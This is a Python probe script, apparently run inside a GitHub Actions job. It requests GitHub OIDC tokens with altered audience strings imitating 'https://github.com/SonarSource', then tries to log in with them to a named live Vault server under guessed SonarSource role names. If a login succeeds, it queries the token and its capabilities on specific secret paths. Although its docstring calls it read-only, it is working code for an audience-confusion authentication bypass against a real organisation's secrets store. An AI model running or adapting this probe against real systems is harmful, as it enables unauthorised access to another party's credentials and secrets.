#!/usr/bin/env python3
"""11998 control probe: is GitHub's refusal of aud=https://github.com/SonarSource stable,
and do trailing-slash / percent-encoded variants become issuable?

Strictly read-only: only GitHub OIDC token service + Vault /v1/sys/health and
POST /v1/auth/jwt-ghwf/login (<=10, only if a SonarSource-equivalent aud is actually minted).
No writes, no role/enumeration beyond the 10 role names already proven to exist.
"""
import base64, json, os, sys, time, urllib.error, urllib.parse, urllib.request

VAULT = "https://vault.sonar.build"
RESULT = {"probe": "11998-control-aud"}

AUD_TESTS = [
    ("baseline_owner_url", "https://github.com/SonarSource"),
    ("trailing_slash", "https://github.com/SonarSource/"),
    ("pct_encoded_literal", "https://github.com/SonarSource%2F"),
    ("lowercase_owner", "https://github.com/sonarsource"),
    ("double_slash", "https://github.com//SonarSource"),
]

PUBLIC_REPOS = ["sonar-java", "sonarlint-vscode", "sonarqube-mcp-server",
                "sonar-scanner-cli", "docker-sonarqube"]


def http(method, url, data=None, headers=None, timeout=25):
    h = {"User-Agent": "oidc-vault-probe-11998"}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"status": r.status, "body": r.read(300000)}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "body": e.read(300000)}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {str(e)[:300]}"}


def jb(r):
    try:
        return json.loads(r["body"].decode("utf-8", "replace")) if r.get("body") else None
    except Exception:
        return {"_raw": (r.get("body") or b"")[:1000].decode("utf-8", "replace")}


def errs(j):
    if isinstance(j, dict):
        if isinstance(j.get("errors"), list):
            return "; ".join(str(x) for x in j["errors"])[:600]
        return json.dumps(j)[:600]
    return str(j)[:600]


def claims_of(jwt):
    try:
        p = jwt.split(".")[1]
        p += "=" * (-len(p) % 4)
        c = json.loads(base64.urlsafe_b64decode(p))
        return {k: c.get(k) for k in ("aud", "iss", "sub", "repository", "repository_owner",
                                      "repository_id", "ref", "job_workflow_ref", "environment")}
    except Exception as e:
        return {"_err": str(e)}


def mint(aud):
    url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not url or not tok:
        return {"status": None, "error": "no ACTIONS_ID_TOKEN_REQUEST_* env"}
    u = url + ("&" if "?" in url else "?") + "audience=" + urllib.parse.quote(aud, safe="")
    r = http("GET", u, headers={"Authorization": "Bearer " + tok}, timeout=30)
    out = {"aud_requested": aud, "status": r["status"], "error": r.get("error")}
    j = jb(r)
    if isinstance(j, dict) and j.get("value"):
        out["issued"] = True
        out["jwt_claims"] = claims_of(j["value"])
        out["_jwt"] = j["value"]
    else:
        out["issued"] = False
        out["response"] = j
    return out


def main():
    st, _ = http("GET", VAULT + "/v1/sys/health")
    RESULT["vault_health_status"] = st

    minted = {}
    RESULT["aud_mint"] = []
    for name, aud in AUD_TESTS:
        r = mint(aud)
        RESULT["aud_mint"].append({"name": name, **{k: v for k, v in r.items() if k != "_jwt"}})
        if r.get("issued"):
            minted[name] = (r["aud_requested"], r["_jwt"])

    # If any SonarSource-equivalent aud was actually issuable, use it against the
    # 10 role names already proven to exist in 11978 (<=10 logins total).
    RESULT["logins"] = []
    if minted:
        n = 0
        for name, (aud, jwt) in minted.items():
            for repo in PUBLIC_REPOS:
                for suffix in ("", "-protected"):
                    if n >= 10:
                        break
                    role = f"github-sonarsource-{repo}{suffix}"
                    r = http("POST", VAULT + "/v1/auth/jwt-ghwf/login",
                             data={"jwt": jwt, "role": role})
                    j = jb(r)
                    issued = bool(isinstance(j, dict) and isinstance(j.get("auth"), dict)
                                  and j["auth"].get("client_token"))
                    RESULT["logins"].append({"aud_variant": name, "role": role,
                                             "status": r["status"], "issued": issued,
                                             "vault_error": errs(j)})
                    n += 1
                    if issued:
                        tok = j["auth"]["client_token"]
                        H = {"X-Vault-Token": tok, "X-Vault-Request": "true"}
                        RESULT["lookup_self"] = jb(http("GET", VAULT + "/v1/auth/token/lookup-self", headers=H))
                        RESULT["capabilities_self"] = jb(http("POST", VAULT + "/v1/sys/capabilities-self",
                                                             data={"paths": ["development/kv/data/code-security-diff-val-claude-code",
                                                                             "development/kv/data/jira"]},
                                                             headers=H))
                        break
                if any(x.get("issued") for x in RESULT["logins"]):
                    break
            if any(x.get("issued") for x in RESULT["logins"]):
                break
    else:
        RESULT["logins"] = "SKIPPED: no SonarSource-equivalent audience could be minted"

    print("===RESULT_JSON===")
    print(json.dumps(RESULT, indent=1)[:20000])


main()
